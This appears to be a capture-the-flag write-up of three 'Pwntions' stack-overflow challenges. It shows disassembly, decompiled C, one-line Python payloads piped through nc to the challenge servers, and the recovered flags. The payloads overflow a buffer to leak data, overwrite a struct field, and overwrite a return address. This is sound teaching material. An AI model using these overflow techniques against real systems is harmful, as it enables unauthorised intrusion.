# Pwntions 1
Running `file` on the given binary shows that it is a 32-Bit ELF.

Disassembling the given binary `pwntions_public` in GDB in main we have the following:
```asm
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x080493e7 <+0>:	lea    ecx,[esp+0x4]
   0x080493eb <+4>:	and    esp,0xfffffff0
   0x080493ee <+7>:	push   DWORD PTR [ecx-0x4]
   0x080493f1 <+10>:	push   ebp
   0x080493f2 <+11>:	mov    ebp,esp
   0x080493f4 <+13>:	push   ecx
   0x080493f5 <+14>:	sub    esp,0x4
   0x080493f8 <+17>:	mov    eax,ds:0x804b4e4
   0x080493fd <+22>:	push   0x0
   0x080493ff <+24>:	push   0x2
   0x08049401 <+26>:	push   0x0
   0x08049403 <+28>:	push   eax
   0x08049404 <+29>:	call   0x80490e0 <setvbuf@plt>
   0x08049409 <+34>:	add    esp,0x10
   0x0804940c <+37>:	call   0x8049311 <print_banner>
   0x08049411 <+42>:	call   0x8049226 <answer_professor>
   0x08049416 <+47>:	mov    eax,0x0
   0x0804941b <+52>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x0804941e <+55>:	leave
   0x0804941f <+56>:	lea    esp,[ecx-0x4]
   0x08049422 <+59>:	ret
End of assembler dump.
```

Taking a closer look at `<answer_professor>`
This portion I decompiled in Ghidra
```C
/* WARNING: Could not reconcile some variable overlaps */

void answer_professor(void)

{
  char *pcVar1;
  char student_answer [32];
  char flag [49];
  
  student_answer._0_4_ = 0;
  student_answer._28_4_ = 0;
  pcVar1 = (char *)0x0;
  do {
    *(undefined4 *)(student_answer + 1 + (int)pcVar1) = 0;  //Places '0' in the array here
    pcVar1 = pcVar1 + 4;
  } while (pcVar1 < student_answer + (0x1d - (int)(student_answer + 1)));
  puts("\n\nProfessor maritio_o:");
  puts(
      "\"As there is little foolish wand-waving here, many of you will\nhardly believe this ismagic. I don\'t expect you will really\nunderstand the beauty of the softly simmeringcauldron with\nits shimmering fumes, the delicate power of liquids that\ncreep through thehuman veins, bewitching the minds, ensnaring\nthe senses... I can teach you how to bottlefame, brew glory,\nand even stopper death - if you aren\'t as big a bunch of\ndunderheads asI usually have to teach.\"\n"
      );
  puts("Student:");
  read(0,student_answer,0x30);
  puts(student_answer);
  return;
}
```
We can see that the flag is embedded and that we are prompted to place input into the `student_answer` array. Also take note that a 0 is moved into the array so that it currently contains one element.

The idea is to overflow the `student_answer` array, thus allowing us to print the flag array instead.

Script: `python -c 'print "A" * 31' | nc pwntion1.tghack.no 1061`

Flag: `TG19{remember that C always terminates on null bytes^_^}`

# Pwntions 2

This is very similar to the last one except that in the `answer_professor` function there is a check if a structure member is equal to one.

```C

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void answer_professor(void)

{
  question student_question;
  
  setvbuf(stdout,(char *)0x0,2,0);
  memset(&student_question,0,0x34);
  puts("\n\nProfessor maritio_o:");
  puts("> Welcome to the second class about stack overflow pwntions!");
  puts("> Pls don\'t hesitate to ask questions!\n");
  puts("Student:");
  printf("> ");
  read(0,&student_question,0x40);
  puts((char *)&student_question);
  if (student_question.is_magical_question == 1) {        //HERE
    puts("Professor maritio_o:");
    puts("> Excellent! Ten points to your house!");
    printf("> ");
    system("cat flag.txt");
  }
  else {
    puts("Professor maritio_o:");
    puts("> That\'s a good question, you should Google that!");
  }
  return;
}
```

Script: `python -c 'print "A" * 48  + "\x01\x00\x00\x00"' | nc pwntion2.tghack.no 1062`

Flag: `TG19{Wow! You_may_also_stack_overflow_into_a_struct}`

# Pwntions 3

Script: `python -c 'print "A" * 44 + "\xb6\x86\x04\x08"' | nc pwntion3.tghack.no 1063`

Flag: `TG19{Awesome! You are now better at pwning than many CTFers!! Congratulations}`
